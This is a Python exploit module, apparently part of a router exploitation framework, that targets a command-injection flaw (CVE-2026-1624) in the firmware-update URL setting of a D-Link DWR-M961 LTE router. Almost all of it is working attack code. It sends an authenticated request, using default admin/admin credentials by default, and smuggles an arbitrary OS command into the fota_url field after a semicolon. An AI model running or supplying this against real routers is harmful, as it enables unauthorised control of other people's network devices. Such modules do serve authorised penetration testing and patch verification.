# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import time
import urllib.parse
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """D-Link DWR-M961 FOTA URL Command Injection (CVE-2026-1624).

    The D-Link DWR-M961 wireless LTE router contains a command
    injection vulnerability in the firmware-over-the-air (FOTA) update
    URL configuration. The ``fota_url`` parameter in the management
    interface is passed to a shell command without sanitization,
    allowing authenticated command injection.

    CVSS v3.1: 8.0 (High), AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "D-Link DWR-M961 FOTA URL Command Injection (CVE-2026-1624)",
        "description": (
            "Exploits CVE-2026-1624 via command injection in the FOTA "
            "URL configuration of the D-Link DWR-M961. The fota_url "
            "parameter is concatenated into a shell command without "
            "sanitization, enabling OS command injection with admin "
            "credentials."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-1624",
            "https://supportannouncement.us.dlink.com/security/publication.aspx",
        ),
        "disclosure_date": "2026-02-25",
        "platform": "linux",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "D-Link DWR-M961 (firmware < 1.1.42)",
        ),
    }

    target = OptIP("", "Target D-Link router IP")
    port = OptPort(80, "Target HTTP port")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject via fota_url")
    username = OptString("admin", "Admin username")
    password = OptString("admin", "Admin password")

    _FOTA_PATH = "/cgi-bin/fota_upgrade.cgi"

    def _build_url(self, path: str) -> str:
        return f"http://{self.target}:{self.port}{path}"

    def _http_post_auth(self, path: str, data: dict) -> tuple[int, str]:
        url = self._build_url(path)
        encoded = urllib.parse.urlencode(data).encode("utf-8")
        req = urllib.request.Request(url, data=encoded, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        import base64
        creds = base64.b64encode(
            f"{self.username}:{self.password}".encode()
        ).decode()
        req.add_header("Authorization", f"Basic {creds}")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    @mute
    def check(self) -> bool:
        """Check if the web management is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(f"Cannot connect to {self.target}:{self.port}")
            return

        print_success("Web interface reachable; injecting command via FOTA URL")
        self._exploit()

    def _exploit(self) -> None:
        injected = f"http://update.dlink.com/fw.bin;{self.command};"

        payload = {
            "fota_url": injected,
            "action": "check",
        }

        print_status(f"Injecting via fota_url: {injected!r}")

        status, body = self._http_post_auth(self._FOTA_PATH, payload)

        if status == 200:
            print_success(
                f"HTTP {status}. Command '{self.command}' should have "
                f"executed on the D-Link router."
            )
        elif status == 401:
            print_error("Authentication failed; check credentials")
        else:
            print_error(f"Unexpected HTTP {status}")
